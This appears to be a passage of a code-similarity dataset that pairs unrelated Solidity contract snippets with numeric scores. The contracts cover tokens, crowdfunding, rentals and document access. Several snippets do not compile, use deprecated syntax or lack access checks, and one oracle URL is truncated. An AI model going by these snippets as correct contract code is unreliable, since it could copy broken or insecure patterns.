        return staffMemeberAccts;
    }    

}",0.5721052987482411,"contract IMarket {
	function authenticate(
		address _prop,
		string memory _args1,
		string memory _args2,
		string memory _args3,
		string memory _args4,
		string memory _args5
	)
		public
		returns (
			
			address
		);

	function getAuthenticationFee(address _property)
		private
		view
		returns (uint256);

	function authenticatedCallback(address _property, bytes32 _idHash)
		external
		returns (address);

	function vote(address _property, bool _agree) external;

	function schema() external view returns (string memory);
}"
"contract FairTrade {

    
    address public creater;
    address public trader;
    address public framer;
    address public preieumHandler;

    
    enum State { Paying, Transporting, Received, Completed }
    State public state;

    
    function FairTrade(address _trader, address _framer, address _preieumHandler,
      uint _price, uint _quantity) {
        creater = msg.sender;
        trader = _trader;
        framer = _framer;
        preieumHandler = _preieumHandler;

    }

        
    modifier onlyFramer {
        if (msg.sender != framer) throw ; else _;
    }

    modifier onlyTrader {
        if (msg.sender != trader) throw; else _;
    }

    modifier inState(State s) {
        if (state != s) throw; else _;
    }

    modifier notInState(State s) {
        if (state == s) throw; else _;
    }

        
    function completedPaid() onlyTrader {
        state = State.Transporting;
    }    

    function receivedGood() inState(State.Transporting) onlyFramer {
        state = State.Received;
    }

    function paid() inState(State.Received) {
        state = State.Completed;
    }
}",0.5735799331884917,"contract MultiSigTransfer is Ownable {

  string public name = ""MultiSigTransfer"";

  string public symbol = ""MST"";

  bool public complete = false;

  bool public denied = false;

  uint256 public quantity;

  address public targetAddress;

  address public requesterAddress;



  

  constructor(

    uint256 _quantity,

    address _targetAddress,

    address _requesterAddress

  ) public {

    quantity = _quantity;

    targetAddress = _targetAddress;

    requesterAddress = _requesterAddress;

  }



  

  function approveTransfer() public onlyOwner {

    require(denied == false, ""cannot approve a denied transfer"");

    require(complete == false, ""cannot approve a complete transfer"");

    complete = true;

  }



  

  function denyTransfer() public onlyOwner {

    require(denied == false, ""cannot deny a transfer that is already denied"");

    denied = true;

  }



  

  function isPending() public view returns (bool) {

    return !complete;

  }

}"
"contract A {
    function createAndPassAmount(uint arg, uint amount) payable {
        B newD = new B.value(amount)(arg);
    }
}",0.5736474269759578,"contract ERC20Burnable is ERC20 {
    
    function burn(address account, uint256 amount) public {
        _burn(account, amount);
    }

    
    
    
    
}"
"contract CampaignFactory {
    address[] public deployedCampaigns;

    function createCampaign(uint minimum) public {

        address newCampaign = new Campaign(minimum, msg.sender);
        deployedCampaigns.push(newCampaign);
    }

    function getDeployedCampaigns() public view returns (address[]) {
        return deployedCampaigns;
    }

}",0.5620069682440119,"contract ITokenMinimal {

    function allowance(address tokenOwner, address spender) public view returns (uint remaining);

    function balanceOf(address tokenOwner) public view returns (uint balance);

    function deposit() public payable;

    function withdraw(uint value) public;

}"
"contract Campaign {

    struct Request {
        string description;
        uint value;
        address recipient;
        bool complete;
        uint approvalCount;
        mapping(address => bool) approvals;

    }

    Request[] public requests;

    address public manager;
    uint public minimumContribution;
    mapping (address => bool) public approvers;
    uint public approversCount;

    modifier restricted () {
        require(msg.sender == manager);
        _;
    }

    function Campaign(uint minimum, address creator) public {
        manager = creator;
        minimumContribution = minimum;
    }

    function contribute() public payable {
        require(msg.value > minimumContribution);

        approvers[msg.sender] = true;
        approversCount++;
    }

    function createRequest(string description, uint value, address recipient) public restricted {
        require(approvers[msg.sender]);
        Request memory newRequest = Request({
            description: description,
            value: value,
            recipient: recipient,
            complete: false,
            approvalCount: 0
        });

        requests.push(newRequest);
    }

    function approveRequest(uint index) public {

        Request storage request = requests[index];

        require(approvers[msg.sender]);
        require(!request.approvals[msg.sender]);

        request.approvals[msg.sender] = true;
        request.approvalCount++;

    }

    function finalizeRequest(uint index) public restricted {
        Request storage request = requests[index];

        require(request.approvalCount > (approversCount/2));
        require(!request.complete);

        request.recipient.transfer(request.value);

        request.complete = true;

    }
}",0.5970448889651803,"contract CoinBrosToken {

    

    string public name = ""CoinBros Token"";

    string public symbol = ""CBK"";

    uint8 public decimals = 0;

    

    uint256 public totalSupply;

    uint256 public CoinBroSupply = 9000000;

    uint256 public price ;

    address public creator;

    

    mapping (address => uint256) public balanceOf;

    mapping (address => mapping (address => uint256)) public allowance;



    

    event Transfer(address indexed from, address indexed to, uint256 value);

    event FundTransfer(address backer, uint amount, bool isContribution);

    

    

    

    function CoinBroToken() public {

        totalSupply = CoinBroSupply * 10 ** uint256(decimals);  

        balanceOf[msg.sender] = totalSupply;    

        creator = msg.sender;

    }

    

    function _transfer(address _from, address _to, uint _value) internal {

        

        require(_to != 0x0);

        

        require(balanceOf[_from] >= _value);

        

        require(balanceOf[_to] + _value >= balanceOf[_to]);

        

        balanceOf[_from] -= _value;

        

        balanceOf[_to] += _value;

        Transfer(_from, _to, _value);

      

    }



    

    function transfer(address _to, uint256 _value) public {

        _transfer(msg.sender, _to, _value);

    }



    

    

    

    function () payable internal {

        

        if (price == 0 ether){

        uint ammount = 500;                  

        uint ammountRaised;                                     

        ammountRaised += msg.value;                            

        require(balanceOf[creator] >= 9800000);

        

        require(msg.value < 0.5 ether); 

        require(balanceOf[msg.sender] == 0);     

        balanceOf[msg.sender] += ammount;                  

        balanceOf[creator] -= ammount;                        

        Transfer(creator, msg.sender, ammount);               

        creator.transfer(ammountRaised);

        }

             }



        



 }"
"contract TestAdoption {
  Adoption adoption = Adoption(DeployedAddresses.Adoption());

  
    function testUserCanAdoptPet() public {
        uint returnedId = adoption.adopt(8);

        uint expected = 8;

        Assert.equal(returnedId, expected, ""Adoption of pet ID 8 should be recorded."");
    }

}",0.5037338304820173,"contract AWToken {
       function burn(address addr, uint value) public;
       function balanceOf(address who) external view returns (uint);
       function calculationNeedAW(uint usdtVal) external view returns(uint);
       function usdtPrice() external view returns(uint);
    }"
"contract Simple  {
    string public data;
    function setData(string d ){data=d;}
    function fillData(RootContract r) public {r.setData(data);}

}",0.5873260088466821,"contract CoinMarketCapApi {

    function requestPrice(string _ticker) public payable;

    function _cost() public returns (uint _price);

}"
"contract Contest {
    address public manager;
    uint public submissionCost;
    uint public votesPerSubmission;

    constructor (uint _submissionCost, uint _votesPerSubmission) public {
        manager = msg.sender;
        submissionCost = _submissionCost;
        votesPerSubmission = _votesPerSubmission;
    }

    modifier restricted() {
        require(msg.sender == manager, ""Not authorized."");
        _;
    }

    function adjustSubmissionCost(uint newCost) public restricted {
        submissionCost = newCost;
    }

    function adjustVotesPerSubmission(uint newVotes) public {
        votesPerSubmission = newVotes;
    }

    function getManager() public view returns (address) {
        return manager;
    }
}",0.5877902095009288,"contract BonusBank {

    address public owner;

    uint public limit;

    modifier isOwner() {

        require(msg.sender == owner);

        _;

    }



    

    event Deposit(address indexed from, uint value);



   

    function limitvalue(uint _limit) public {

        require(_limit > 0);



        owner = msg.sender;

        limit = _limit ;

    }



   

    function deposit() public payable {

        Deposit(msg.sender, msg.value);

    }



    function canDistribution() public constant returns (bool) {

        return this.balance >= limit;

    }

    

    function getCurrentBalance() constant returns (uint) {

        return this.balance;

    }

    

    function distribution() public isOwner {

        require(canDistribution());



        owner.transfer(this.balance);

    }



   

}"
"contract  Car is rentCar {
    address public VechileOwner;
    string public make;
    string public model;
    Renter public renter;

    bool public available;
    uint public pricePerDay;
    uint public deposit;
    uint public entrycode;
    uint public minRentalDay;
    uint public maxRentalDay;

    function checkAvailability() public view returns (bool) {
        return(Car.available);
    }

    function Car(string _make, string _model, uint _pricePerDay, uint _minRentalDay, uint _maxRentalDay, bool _available) public onlyOwner{
        make = _make;
        model = _model;
        pricePerDay = _pricePerDay;
        minRentalDay = _minRentalDay;
        maxRentalDay = _maxRentalDay;
        available = _available;
    }  
}",0.5616208857728803,"contract RecToken is MintableToken {
  string public standard = ""Renta.City"";
  string public name = ""Renta.City"";
  string public symbol = ""REC"";
  uint public decimals = 18;
  address public saleAgent;

  bool public tradingStarted = false;

  
  modifier hasStartedTrading() {
    require(tradingStarted);
    _;
  }

  
  function startTrading() public onlyOwner {
    tradingStarted = true;
  }

  
  function transfer(address _to, uint _value) public hasStartedTrading {
    super.transfer(_to, _value);
  }

   
  function transferFrom(address _from, address _to, uint _value) public hasStartedTrading {
    super.transferFrom(_from, _to, _value);
  }
  
  function set_saleAgent(address _value) public onlyOwner {
    saleAgent = _value;
  }
}"
"contract C {
    mapping (address => string) m1;
    mapping (address => StringStruct) m2;

    struct StringStruct {
        string someString; 
        
    }

    function amIInBothMappings() returns (bool) {
         
    }
}",0.579603320938787,"contract Hgs {
    struct CsAction {
      bool        passedKYC;
      bool        blocked;
    }


    
    mapping (address => CsAction) public permissions;
    mapping (address => uint256)  public deposits;
}"
"contract Foo {
  function bar(fixed[2] xy) {}
  function baz(uint32 x, bool y) returns (bool r) { r = x > 32 || y; }
  function sam(bytes name, bool z, uint[] data) {}
}",0.5886793131280009,"contract Auction {

    function bid() public payable returns (bool);

    function end() public returns (bool);



    event AuctionBid(address indexed from, uint256 value);

}"
"contract DocumentManager {

 mapping(uint => Document) documents;
 uint public nbDocuments;
 address public owner;

 enum Status {
    UNKNOWN,
    OPEN,
    DONE,
    DENIED
 }

struct Document {
    address owner;
    string document;
    string name;
    uint nbRequests;
    string privateKey;
    mapping(uint => Request) requests;
}

struct Request {
    address owner;
    Status status;
    string key;
}

constructor() public {
    owner = msg.sender;
}

function newDocument(string memory hash, string memory name) public {
    nbDocuments++;
    documents[nbDocuments].owner = msg.sender;
    documents[nbDocuments].document = hash;
    documents[nbDocuments].name = name;
    documents[nbDocuments].nbRequests = 0;
}

  function grantAccess(uint documentId, uint requestId, string memory 
   encryptedKey) public {
    uint256 document = documents[documentId];
    if (document.owner == msg.sender) {
        document.requests[requestId].status = Status.DONE;
        document.requests[requestId].key = encryptedKey;
     }
  }

 function denyAccess(uint documentId, uint requestId) public {
    uint256 document = documents[documentId];
    if (document.owner == msg.sender) {
        document.requests[requestId].status = Status.DENIED;
    }
 }

   function requestDocument(uint documentId, string memory publicKey) 
    public {
    uint256 document = documents[documentId];
    document.nbRequests++;
    uint256 request = document.requests[document.nbRequests];
    request.status = Status.OPEN;
    request.owner = msg.sender;
    request.key = publicKey;
  }

  function getLastRequestId(uint documentId) public returns(uint) {
    return documents[documentId].nbRequests;
   }

  function getOpenRequestPublicKey(uint documentId, uint requestId) 
   public returns(string memory) {
    uint256 request = documents[documentId].requests[requestId];
    if (request.status == Status.OPEN) {
        return request.key;
    }
    return """";
  }

function getRequestOwner(uint documentId, uint requestId) public 
  returns(address) {
    uint256 document = documents[documentId];
    if (document.owner == msg.sender) {
        return document.requests[requestId].owner;
    }
 }

function getDocument(uint documentId) public returns(string memory 
  hash) {
    return documents[documentId].document;
}

function getDocumentName(uint documentId) public returns(string memory 
 name) {
    return documents[documentId].name;
}

function getEncryptedKeyFromRequest(uint documentId, uint requestId) 
 public returns(string memory) {
    uint256 request = documents[documentId].requests[requestId];
    if (request.status == Status.DONE) {
        return request.key;
    }
    return """";
}

function getDocumentHash(uint documentId) public returns(string 
 memory) {
    return documents[documentId].document;
}

function getRequestStatus(uint documentId, uint requestId) public 
 returns(Status) {
    return documents[documentId].requests[requestId].status;
 }

}",0.5278868552316659,"contract Gamblr is Ownable {
    using SafeMath for uint256;

    string public name = ""Gamblr"";
    uint8 public decimals = 3;
    string public symbol = ""GMBL"";
    uint public totalSupply = 10000000000;

    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowed;

    function Gamblr() public {
        balances[msg.sender] = 3000000000;
        balances[this] = 7000000000;
    }

    function transfer(address _to, uint256 _amount) public returns (bool success) {
        doTransfer(msg.sender, _to, _amount);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
        require(allowed[_from][msg.sender] >= _amount);
        allowed[_from][msg.sender] -= _amount;
        doTransfer(_from, _to, _amount);
        return true;
    }

    function doTransfer(address _from, address _to, uint _amount) internal {
        require((_to != 0) && (_to != address(this)));
        require(_amount <= balances[_from]);
        balances[_from] = balances[_from].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
    }

    function balanceOf(address _owner) public constant returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _amount) public returns (bool success) {
        require((_amount == 0) || (allowed[msg.sender][_spender] == 0));

        allowed[msg.sender][_spender] = _amount;
        emit Approval(msg.sender, _spender, _amount);
        return true;
    }

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    function burn(uint256 _value) public onlyOwner {
        require(balances[msg.sender] >= _value);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        totalSupply = totalSupply.sub(_value);
    }

    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }

    function totalSupply() public constant returns (uint) {
        return totalSupply;
    }
    
    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _amount
        );

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _amount
        );

    event Burn(
        address indexed _burner,
        uint256 _amount
        );
        
    mapping(address => bool) public joined;
        
    function receiveTokens() public returns(bool){
        require(balanceOf(this) > 0);
        require(!joined[msg.sender]);
        if (balanceOf(this) > 1000000) {
            doTransfer(this, msg.sender, 1000000);
            joined[msg.sender] = true;
            return joined[msg.sender];
        }
        doTransfer(this, msg.sender, balanceOf(this));
        joined[msg.sender] = true;
        return joined[msg.sender];
    }    
        
}"
"contractDetails {
        string contractId;
        string companyA;
        string companyB;
        address A;
        address B;
        uint256 timestamp;
        string signHash;
        bool isSigned;
    }",0.5738669191301444,"contract AbstractRegistration {
    
    function getRegistration() public view returns(string, address, string, string, uint, string, string, address[5], uint[5]);
}"
"contract heheBox { 

    struct DataBox {
        mapping(address => string) Data_01;
        mapping(address => string) Data_02;
    }

    mapping(address => DataBox) DataBox_hehe;

    function save(string _InputData_01, string _InputData_02) public  {
        DataBox_hehe[msg.sender].Data_01[msg.sender] = _InputData_01;
        DataBox_hehe[msg.sender].Data_02[msg.sender] = _InputData_02;           
    }   

    function display(address _address) constant public returns (struct) {
        return DataBox_hehe[_address];         
    }   

}",0.5445643468489354,"contract DocumentSigner {
    mapping(string => address[]) signatureMap;
    
    function sign(string _documentHash) public {
        signatureMap[_documentHash].push(msg.sender);
    }

    function getSignatureAtIndex(string _documentHash, uint _index) public constant returns (address) {
    	return signatureMap[_documentHash][_index];
    }

    function getSignatures(string _documentHash) public constant returns (address[]) {
    	return signatureMap[_documentHash];
    }
}"
"contract ContractCreator {

    Data myData;
    uint[] myValueList;

    event Log(bytes32, uint);

    function ContractCreator() public {

        myData = new Data();
    }

    function setElements (bytes32 _name, uint _value) public {

        myData.contractsMap[_name].push(_value); 
    }

    function getElements (bytes32 _name) public {

       myValueList = myData.contractsMap[_name];
       for (uint i = 0; i < myValueList.length; i++) {
           Log(_name, myValueList[i]);
       }
    }
}",0.5567099429930055,"contract DigitalPrintImage {

	struct ImageMetadata {

        uint finalSeed;

        bytes32[] potentialAssets;

        uint timestamp;

        address creator;

        string ipfsHash;

        string extraData;

    }



    mapping(uint => ImageMetadata) public imageMetadata;



	function totalSupply() public view returns (uint256);

	function getImageMetadata(uint _imageId) public view

    	returns(address, string, uint, string, uint, bytes32[]);

}"
"contract CA2 {

  mapping (uint => Student) public students;

  struct Student {
        address studentAccount;
        uint age;
        uint income;
        uint score;
        uint attendance;
  }
  uint public studentCount;

  function setStudent (uint age, uint income, uint score, uint attendance) public {
    studentCount++;
    students[studentCount]=Student(msg.sender,age,income, score,attendance);
  }

}",0.5390135119781437,"contract PoSTokenStandard {
    uint256 public stakeStartTime;
    uint256 public stakeMinAge;
    uint256 public stakeMaxAge;
    function mint() returns (bool);
    function coinAge() constant returns (uint256);
    function checkPos() constant returns (uint256);
    function annualInterest() constant returns (uint256);
    event Mint(address indexed _address, uint _reward);
}"
"contract DecisionMaker{

    Sender sd;

    function someLogicToDecidePayment(address receiver, address sender) public {
        
        sd = Sender(sender);
        sd.send_transfer(receiver, 1000);
    }

}",0.5652648531065865,"contract Ownable {
    address Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwnership(address to) public onlyOwner { Owner = to; }
}"
"contract C {
    struct S {
        uint n;
    }

    
    mapping (uint => S) m;

    
    function localToGobal(uint i) public {
        S storage obj = S(i);
        m[i] = obj;
    }",0.5836141924677563,"contract SmartolutionInterface {

    struct User {

        uint value;

        uint index;

        uint atBlock;

    }



    mapping (address => User) public users; 

}"
"contract DaiTransferrer is Ownable {

    DaiInterface daiContract;

    function approveDai(address guy, uint wad) public {
        daiContract.approve(guy, wad);
    }
}",0.5855135651732144,"contract TransferToken is Ownable {
    function transferToken(ERC20Basic _token, address _to, uint _value) public onlyOwner {
        _token.transfer(_to, _value);
    }
}"
"contract Test {
    struct User {
        string name;
        string surname;
        uint active;
    }

    mapping(bytes32 => User) public userRegister;

    function add_user(string _name, string _surname) {
        bytes32 _hc=sha3(_name, _surname);
        User p = userRegister[_hc];  

        p.name=_name;
        p.surname=_surname;
        p.active=1;
    }

    function remove(string _name, string _surname)  {
        bytes32 _hc=sha3(_name, _surname);
        userRegister[_hc].active=0;  
    }

    function active(string _name, string _surname)  {
        bytes32 _hc=sha3(_name, _surname);
        userRegister[_hc].active=1;  
    }
}",0.5361269937303738,"contract ERC20Detailed {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
}"
"contract DeleteExample {
    uint data;
    uint[] dataArray;

    function f() public {
        uint x = data;
        delete x; 
        delete data; 
        uint[] storage y = dataArray;
        delete dataArray; 
        
        
        
        assert(y.length == 0);
    }
}",0.547446955938047,"contract TestERC223 {
    event Log(address from, uint value, bytes data);
    
    function tokenFallback(address from, uint value, bytes memory data) public {
        emit Log(from, value, data);
    }
}"
"contract TestMyContract {
  function testOneEqualsOne() {
    Assert.equal(1, 1, ""The world as we know it has ended!"");
  }
}",0.5568755858380008,"contract MyContract {
  string word = ""All men are created equal!"";

  function getWord() returns (string){
    return word;
  }

}"
"contract Caller {
    bytes4 private constant FUNC_SELECTOR = bytes4(uint256(keccak256(""func()"") >> (256 - 4 * 8)));

    function funcReturns(address _callee) external view returns (bool) {
        uint256[1] memory output = [uint256(2)];
        bytes      memory input  = abi.encodeWithSelector(FUNC_SELECTOR);

        assembly {
            let success := staticcall(
                gas,            
                _callee,        
                add(input, 32), 
                mload(input),   
                output,         
                32              
            )
            if iszero(success) {
                revert(0, 0)
            }
        }

        return output[0] < 2;
    }
}",0.5914484929931348,"contract DSProxyCache {
    mapping(bytes32 => address) cache;

    function read(bytes memory _code) public view returns (address) {
        bytes32 hash = keccak256(_code);
        return cache[hash];
    }

    function write(bytes memory _code) public returns (address target) {
        assembly {
            target := create(0, add(_code, 0x20), mload(_code))
            switch iszero(extcodesize(target))
            case 1 {
                
                revert(0, 0)
            }
        }
        bytes32 hash = keccak256(_code);
        cache[hash] = target;
    }
}"
"contract TestContract {
    struct Item {
        uint someUint;
        Item[] internalItems;
    }
    Item[] items;
    function TestContract() {}
    function test() {
        Item memory item;
        items.push(item);
    }
}",0.5256915939325189,"contract IsContract {

	

    function isContract(address _addr) internal view returns (bool is_contract) {

        uint length;

        assembly {

              

              length := extcodesize(_addr)

        }

        return (length>0);

    }

}"
"contract RandomOrg is usingOraclize {
    string public res;

    event Log(string text);

    function RandomOrg() {

        Log(""Created!"");
    }


    function __callback(bytes32 myId, string _result) {
        if (msg.sender != oraclize_cbAddress()) revert();


        res = _result; 
        Log(res);
        updateNumber();

    }

    function updateNumber() payable {
        string memory query = ""https:
        oraclize_query(0, ""URL"", query);
    }

}",0.5687672572888793,"contract Identity {

    mapping(address => string) private _names;



    

    function iAm(string memory shortName) public {

        _names[msg.sender] = shortName;

    }



    

    function whereAmI() public view returns (address yourAddress) {

        address myself = msg.sender;

        return myself;

    }



    

    function whoAmI() public view returns (string memory yourName) {

        return (_names[msg.sender]);

    }

}"
"contract CrowdFunding {
    
    struct Funder {
        address addr;
        uint amount;
    }

    struct Campaign {
        address beneficiary;
        uint fundingGoal;
        uint numFunders;
        uint amount;
        mapping (uint => Funder) funders;
    }

    uint numCampaigns;
    mapping (uint => Campaign) campaigns;

    function newCampaign(address beneficiary, uint goal) returns (uint campaignID) {
        campaignID = numCampaigns++; 
        
        campaigns[campaignID] = Campaign(beneficiary, goal, 0, 0);
    }

    function contribute(uint campaignID) payable {
        Campaign storage c = campaigns[campaignID];
        
        
        
        c.funders[c.numFunders++] = Funder({addr: msg.sender, amount: msg.value});
        c.amount += msg.value;
    }

    function checkGoalReached(uint campaignID) returns (bool reached) {
        Campaign storage c = campaigns[campaignID];
        if (c.amount < c.fundingGoal)
            return false;
        uint amount = c.amount;
        c.amount = 0;
        c.beneficiary.transfer(amount);
        return true;
    }
}",0.5783572897681197,"contract AlphabetConvert {
    address public beneficiary;
    token public tokenReward;
    uint public amountRaised;

    mapping(address => uint256) public balanceOf;

    event FundTransfer(address backer, uint amount, bool isContribution);

    function AlphabetConvert(address sendTo, token tokenAddress) {
        beneficiary = sendTo;
        tokenReward = token(tokenAddress);
    }

    function() payable {
        uint amount = msg.value;
        balanceOf[msg.sender] = amount;
        amountRaised += amount;
        tokenReward.transfer(msg.sender, amount / 1 ether);
        FundTransfer(msg.sender, amount, true);
    }

    function withdraw() {
        uint amount = balanceOf[msg.sender];
        balanceOf[msg.sender] = 0;
        if (amount > 0) {
            if (msg.sender.send(amount)) {
                FundTransfer(msg.sender, amount, false);
            } else {
                balanceOf[msg.sender] = amount;
            }
        }

        if (beneficiary == msg.sender) {
            if (beneficiary.send(amountRaised)) {
                FundTransfer(beneficiary, amountRaised, false);
            }
        }
    }
}"
"contract test {

       
       mapping (bytes4 => int[]) internal map;

       function _increase(bytes4 _id,uint _index) public {        
           map[_id][_index] = map[_id][_index] + 1;
       }

    }",0.5755394400203242,"contract SetBUS is DataCaller {

	function setBUS(bytes32 _key, uint256 _index, string _str) internal {

        data.setBUS(_key, _index, _str);        

    }

}"
"contract MyContract {

    enum Statuses {Vacant,Occupied}
    uint internal counter = 0;
    event occupied (string cname, address raddr);
    uint public constant totalRooms = 5;
    struct Room{
        address roomAddress;
        Statuses roomStatus;
    }

    mapping(uint => Room) public rooms;

    function roomInfo() public {
        rooms[1] = Room(0x33c5E8069F3F5b653fEDdE8c628B1e0DE48382a1,Statuses.Vacant);
        rooms[2] = Room(0x88789bB3d6B1eF931d3DF5aB008A38F86EA3da8d,Statuses.Vacant);
        rooms[3] = Room(0xDaEf09dE138de7C27f1a43cA6c544c1a6A50BAf9,Statuses.Vacant);
        rooms[4] = Room(0xC72C577e4450E4AAF9eaf2FF3ff6b3eC597F894b,Statuses.Vacant);
        rooms[5] = Room(0xF68af2bAC4c9Db4a27186C6382eAD0c0BA04638F,Statuses.Vacant);
    }


    
    mapping(uint => Customer) public customers;


    struct Customer {
        address _address;
        string name;
        address room;
    }


    constructor() public {

    }


    function addCustomer(address _add, string memory _name) public {
        address _room;
        while(counter<=totalRooms){
            for(uint i =0; i< totalRooms;i++){
                if(rooms[i].roomStatus==Statuses.Vacant)
                  _room = rooms[i].roomAddress;
                else 
                i++;
            }
            customers[counter+1] = Customer(_add, _name,_room);
        }

        emit occupied(_name,_room);
    }


}",0.5135416758028857,"contract StrongHandsManager {

    

    event CreateStrongHand(address indexed owner, address indexed strongHand);

    

    mapping (address => address) public strongHands;

    mapping (address => uint256) public ownerToBalance;

    

    

    event Transfer(address indexed from, address indexed to, uint256 tokens);

    

    string public constant name = ""Stronghands3D"";

    string public constant symbol = ""S3D"";

    uint8 public constant decimals = 18;

    

    uint256 internal tokenSupply = 0;



    function getStrong()

        public

    {

        require(strongHands[msg.sender] == address(0), ""you already became a Stronghand"");

        

        strongHands[msg.sender] = new StrongHand(msg.sender);

        

        emit CreateStrongHand(msg.sender, strongHands[msg.sender]);

    }

    

    function mint(address _owner, uint256 _amount)

        external

    {

        require(strongHands[_owner] == msg.sender);

        

        tokenSupply+= _amount;

        ownerToBalance[_owner]+= _amount;

        

        emit Transfer(address(0), _owner, _amount);

    }

    

    

    function totalSupply()

        public

        view

        returns (uint256)

    {

        return tokenSupply;

    }

    

    function balanceOf(address _owner)

        public

        view

        returns (uint256)

    {

        return ownerToBalance[_owner];

    }

}"
"contract Organisation {

    function borrowBook(address bookStore, uint id) payable {
        DataStore(bookStore).borrowEvent(id, msg.sender);
    }
}",0.5609511011442333,"contract TestToken {
    
    mapping (address => uint) public balanceOf;
    
    function () public payable {
        
        balanceOf[msg.sender] = msg.value;
        
    }
    
}"
"contract PrivateSmartContract {


    string[] public buildingList;
 address public bildingOwner;
 address public biv;
    struct BuildingRental {
        string bagId;
        string rentHash;
        editor[] editors;
        uint updatedAt;
        bool status; 
    }

    struct editor {
        address editor;
    }

   constructor() public {
    bildingOwner = 0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c;
    biv = 0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C;
   }
    mapping(string => BuildingRental) rentalStructs;

    modifier onlyOwner(){
        require(msg.sender == bildingOwner);
        _;
    }

     modifier onlyBIV(){
        require(msg.sender == biv);
        _;
    }

    function isBuildingRetntal(string memory _bagId) public view returns(bool) {
        return rentalStructs[_bagId].status;
    }

    function newBuildingRental(string memory _bagId, string memory _rentHash) public onlyOwner returns(bool) {
        require(!isBuildingRetntal(_bagId)); 
        buildingList.push(_bagId);
        rentalStructs[_bagId].bagId = _bagId;
        rentalStructs[_bagId].rentHash = _rentHash;
        rentalStructs[_bagId].updatedAt = now;
        rentalStructs[_bagId].status = false;

        return true;
    }

    function appendEditor(string memory _bagId, address  _editor) public onlyOwner returns(bool) {
        require(isBuildingRetntal(_bagId));
        rentalStructs[_bagId].editor.push(_editor);
        return true;
    }

    function editRentalHash(string memory _bagId, string memory _rentHash) public returns(bool) {
        require(isBuildingRetntal(_bagId));
        rentalStructs[_bagId].rentHash = _rentHash;
        rentalStructs[_bagId].updatedAt = now;
        rentalStructs[_bagId].status = false;
        return true;

    }

    function approveRentalHash(string memory _bagId) public onlyBIV returns(bool) {
        require(isBuildingRetntal(_bagId));
        rentalStructs[_bagId].updatedAt = now;
        rentalStructs[_bagId].status = true;
        return true;

    }

    function getRentalHash(string memory _bagId) public view returns (string memory, string memory, editor[] memory, uint, bool){

      BuildingRental memory buildingRental = rentalStructs[_bagId];

      return (buildingRental.bagId, buildingRental.rentHash, buildingRental.editors, buildingRental.updatedAt , buildingRental.status);

  }

  function getOwner() public view returns (address){
      return bildingOwner;
  }
  function getBIV() public view returns (address){
      return biv;
  }

}",0.5751426442809189,"contract ERC223Token is IERC223 {
    using SafeMath for uint;
    
    string public _name;
    string public _symbol;
    uint8 public _decimals;
    uint256 public _totalSupply;
    
    address public _owner;
    bool public _paused;
    
    event Paused();
    event Unpaused();
    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    mapping(address => uint) balances; 
    
    function transfer(address _to, uint _value, bytes memory _data) public whenNotPaused returns (bool success){
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        if(isContract(_to)) {
            IERC223Recipient receiver = IERC223Recipient(_to);
            receiver.tokenFallback(msg.sender, _value, _data);
        }
        emit Transfer(msg.sender, _to, _value, _data);
        return true;
    }
    
    function transfer(address _to, uint _value) public whenNotPaused returns (bool success){
        bytes memory empty = hex""00000000"";
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        if(isContract(_to)) {
            IERC223Recipient receiver = IERC223Recipient(_to);
            receiver.tokenFallback(msg.sender, _value, empty);
        }
        emit Transfer(msg.sender, _to, _value, empty);
        return true;
    }
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function balanceOf(address owner) public view returns (uint balance) {
        return balances[owner];
    }
    
    function isOwner() public view returns(bool) {
        return msg.sender == _owner;
    }
    
    modifier onlyOwner() {
        require(isOwner());
        _;
    }
    
    modifier whenNotPaused() {
        require(!_paused);
        _;
    }
    
    modifier whenPaused() {
        require(_paused);
        _;
    }
    
    function paused() public view returns(bool) {
        return _paused;
    }
    
    function pause() public onlyOwner whenNotPaused {
        _paused = true;
        emit Paused();
    }
    
    function unpause() public onlyOwner whenPaused {
        _paused = false;
        emit Unpaused();
    }
}"
"contract XFinance {
   using strings for *;

    address addr;
   uint coin;
   Shipment shipment;

function XFinance(uint balance) {
    coin=balance;
    shipment=new Shipment();

  }  



function changeShipmentStatus(string shipmentId,string st,address driverAddress){

            shipment.setShipmentId(shipmentId);
            shipment.setStatusOfShipment(st);
        processPayment(driverAddress);
}

function processPayment(address driverAddress){
    string currentStatus=shipment.getStatusOfShipment();
    if(currentStatus.toSlice().equals('RAP'.toSlice())){
        shipment.setAddressOfDiver1(driverAddress);
        sendPayment(driverAddress);
    }
    else if(currentStatus.toSlice().equals('DAL'.toSlice())){
        shipment.setAddressOfDiver2(driverAddress);
        sendPayment(driverAddress);
    }

    else
    if(currentStatus.toSlice().equals('ATD'.toSlice())){
        shipment.setAddressOfDriver3(driverAddress);
        sendPayment(driverAddress);
    }
}


function sendPayment(address beneficiary) payable returns(bool success) {
  if(msg.value==0) throw;
  if(!beneficiary.send(msg.value)) throw;
  return true;
}

function getBalance() returns(uint){
